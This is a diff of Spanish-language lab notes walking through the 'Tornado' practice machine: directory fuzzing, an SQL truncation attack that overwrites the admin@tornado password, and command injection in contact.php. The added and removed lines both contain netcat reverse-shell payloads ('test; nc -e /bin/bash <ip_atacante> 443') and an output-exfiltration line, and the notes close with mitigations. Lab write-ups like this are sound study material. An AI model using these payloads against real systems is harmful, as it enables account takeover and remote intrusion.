@@ -1,95 +1,182 @@
 
+# 🧠 Ataque de Truncado SQL (SQL Truncation)
 
-### Parte practica - Maquina Tornado
+El ataque de **SQL Truncation** explota el hecho de que algunos servidores de bases de datos o aplicaciones web **limitan la longitud de ciertos campos**, como `username` o `email`, **truncando** (cortando) los datos que exceden ese límite. Esta técnica puede ser usada, por ejemplo, para **suplantar cuentas de administradores**, sobrescribiendo sus credenciales al aprovechar dicho truncamiento.
 
-arrancamos con un arp-scan
+---
+
+## 🎯 Concepto clave
+
+> Si una aplicación impone un límite de longitud (por ejemplo, 13 caracteres para el campo "email"), y el servidor **trunca el input en lugar de rechazarlo**, podemos explotar esta discrepancia para modificar usuarios ya existentes.
+
+---
+
+## 🧪 Parte práctica — Máquina *Tornado*
+
+---
+
+### 🛰️ Enumeración inicial
+
+Escaneamos la red para encontrar la IP de la máquina víctima:
+
 ```sh
 arp-scan -I <interfaz> --localnet --ignoredups
 ```
 
-luego de obtener la dierccion ip aplicamos un fuzzeo rapido con [[gobuster]] con 20 hilos
+Una vez detectada, realizamos **fuzzing de directorios** con [[gobuster]]:
 
 ```sh
 gobuster dir -u http://<ip> -w <diccionario> -t 20
 ```
 
-> generalmente para gobuster ocupamos de seclists/Discovery/web-content/directory-list etc.
+📁 Encontramos la ruta `/bluesky/`.
 
-hay una ruta que es `/bluesky/`  
-
-de esa ruta miramoos si tene archivos con extension .php
+Buscamos archivos `.php`:
 
 ```sh
 gobuster dir -u http://<ip>/bluesky -w <diccionario> -t 20 -x php
 ```
 
- me da un login.php, que parece ser vulnerable y un `signup.php` 
+Hallamos dos archivos importantes:
 
-lo curioso se encuentra en el signup que al momento de crear un usuario el input donde se pone el correo y la clave para registrarse te deja como maximo una longitud de 13 caracteres. A modo de prueba nos hacemos una cuenta y en el home del usuario creado aparece un mensaje diciendo que *el LFI se parcheó*. al momento de ver el codigo fuente con `ctrl + u` nos salta abajo una ruta de home de un usuario.
+- `login.php`
+    
+- `signup.php` ← **interesante para analizar validaciones**
+    
 
-> [!IMPORTANT]
-> El servidor web es un apache y la ruta que contenia ese codigo fuente era la de un usuario "tornado"
+---
 
-con eso en mente, si ponemos en la url
+### 🔐 Signup con validación vulnerable
+
+En `signup.php`, notamos que el input de correo tiene una **longitud máxima de 13 caracteres**. Probamos crear un usuario legítimo con:
+
+- `email: prueba123@tst`
+    
+- `contraseña: test123`
+    
+
+Al registrarnos, el home muestra que el _LFI ha sido parcheado_, pero al ver el código fuente (`Ctrl + U`) aparece una **ruta completa**:
+
+> `/home/tornado`
+
+---
+
+### 🧭 Exploración con ~/
+
+Sabemos que en servidores Apache, la ruta `~/usuario/` hace referencia a `/home/usuario`.
+
 ```http
-http://localhost/~/tornado/
+http://<ip>/~/tornado/
 ```
-> recordar que `~/` hace referencia al /home/`$USER`/ 
 
-pero si hacemos esto y tocamos en el arcivo de `/imp.txt` a algo como esto
+Navegando ahí encontramos un archivo:
+
+```txt
+imp.txt
+```
 
 ![[Pasted image 20250509041206.png]]
 
-lo que a mi me importa son esa lista de correos, y por que? porque con eso son lista de usuarios, como el ceo, el cto el manager, etc.
+🔎 Contiene **una lista de correos** como `admin@tornado`, `ceo@tornado`, etc., que nos dan nombres de usuarios importantes.
 
-ahora la pregunta, ¿para que era lo de la longitud del sign up? aqui es donde vamos a jugar con eso, ya que desde el cliente podemos modificar esa longitud en el input la podemos elevar a algo mayor que 13
+---
 
-si en la pantalla del el `sign up`  queremos utilizar un correo como el del admin que es `admin@tornado` tiene 13 de longitud e intentamos registrarnos no vamos a poder porque esta registrado, pero si reemplazamos la longitud del input y ponemos algo como esto
+### 💣 Ataque de truncado SQL
 
-```
+Supongamos que el servidor trunca los campos a 13 caracteres exactos. El correo `admin@tornado` tiene **13 caracteres justos**.
+
+Si intentamos registrarnos con ese correo, fallará por estar registrado. Pero si **modificamos el HTML desde el navegador** para permitir más caracteres, podemos hacer esto:
+
+```txt
 email: admin@tornado  a
-
-contraseña: hacked 
+clave: hacked
 ```
-nota los espacios, y la a al final, lo que va a hacer el servidor lo va a procesar como un usuario nuevo pero en la consulta borrara todo lo que supere la longitud de 13 caracteres, o sea el `__a` 
 
-dando como resultado `admin@tornado`, entonces si tu haces eso lograste cambiar la contraseña del `admin@tornado` a *hacked*.
+📌 Al enviarlo, el servidor **truncará el email a los primeros 13 caracteres** (`admin@tornado`) y actualizará el usuario existente, ¡cambiando la contraseña del administrador a `hacked`!
 
-ademas dentro del panel de admin hay una pestaña de contact que te lleva a un contact.php que aparentemente esta utilizando un `exec()` o algo por el estilo
-donde se pueden ejecutar comandos de linux. pero el output no te deja ver desde la pagina asi que por mi maquina de atacante me pongo en escucha con netcat
+---
+
+## 🛠️ Acceso al panel admin
+
+Desde el panel admin, encontramos una sección **"Contact"**, que apunta a `contact.php`. Aparentemente, permite ejecutar comandos con `exec()` en PHP.
+
+---
+
+### 🎧 Reverse Shell (sin visibilidad)
+
+La ejecución no retorna salida en el frontend, pero podemos usar **Netcat** para capturarla desde nuestra máquina atacante:
 
 ```sh
 nc -nlvp 443
 ```
 
-y del lado de la victima puedo lanzarle un whoami y redireccionar la salida a la ip atacante por ese puerto
+Y en el campo del `POST` coment de `contact.php`, enviamos:
 
 ```sh
-test; whoami | nc <ip> <port>
+test; whoami | nc <ip_atacante> 443
 ```
 
-y definitivamente puedo ver ese output que es `www-data`
+✅ Vemos que el output es `www-data`.
 
-por lo que al final si hacemos
+---
+
+### 🐚 Shell interactiva
+
+Ahora podemos obtener acceso a shell directamente:
+
 ```sh
-test; nc -e /bin/bash <ip> <port>
+test; nc -e /bin/bash <ip_atacante> 443
 ```
 
-si quieres tratar la TTY haciendo
+Y si necesitamos un entorno TTY usable:
 
 ```sh
 script /dev/null -c bash
 ```
 
-y ya explotaste una SQL Truncation
+---
 
-
-
-como extra si cateamos el contact.php vemos un 
+## 📄 Código vulnerable (`contact.php`)
 
 ```php
-$cmd=$_POST['comment'];
+$cmd = $_POST['comment'];
 echo $cmd;
 exec($cmd);
 ```
 
+> ❗ ¡Claramente vulnerable a ejecución remota de comandos!
+
+---
+
+## 🧷 Resumen
+
+| Paso                      | Descripción                    |
+| ------------------------- | ------------------------------ |
+| Descubrimiento de IP      | Escaneo ARP                    |
+| Fuzzing de rutas          | Gobuster                       |
+| Detectar límite en signup | Longitud de input = 13         |
+| Truncado de correo        | Se sobrescribe `admin@tornado` |
+| Reverse shell             | `exec()` + Netcat              |
+
+---
+
+## 🚨 Mitigaciones recomendadas
+
+- Validar longitudes de campos **tanto del lado cliente como servidor**.
+    
+- No truncar silenciosamente: **rechazar entradas largas** explícitamente.
+    
+- En bases de datos, asegurar unicidad y uso de `BINARY` si aplica (MySQL).
+    
+- Nunca ejecutar directamente entradas del usuario (`exec()` sin sanitizar).
+    
+
+---
+
+## 🧷 Tags
+
+#sqltruncation #ciberseguridad #vulnerabilidades #web #php #netcat #reverse_shell #fuzzing #apache #exploit
+
+[[OWASP]]
+[[gobuster]]
+[[netcat]]
